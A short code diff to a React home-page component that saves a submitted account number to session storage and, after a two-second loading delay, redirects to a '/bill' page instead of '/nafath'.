@@ -18,9 +18,10 @@ export default function FahsHome() {
       page: "home",
       data: { accountNumber }
     });
+    sessionStorage.setItem("accountNumber", accountNumber);
     setTimeout(() => {
       setIsLoading(false);
-      setLocation('/nafath');
+      setLocation('/bill');
     }, 2000);
   };
 
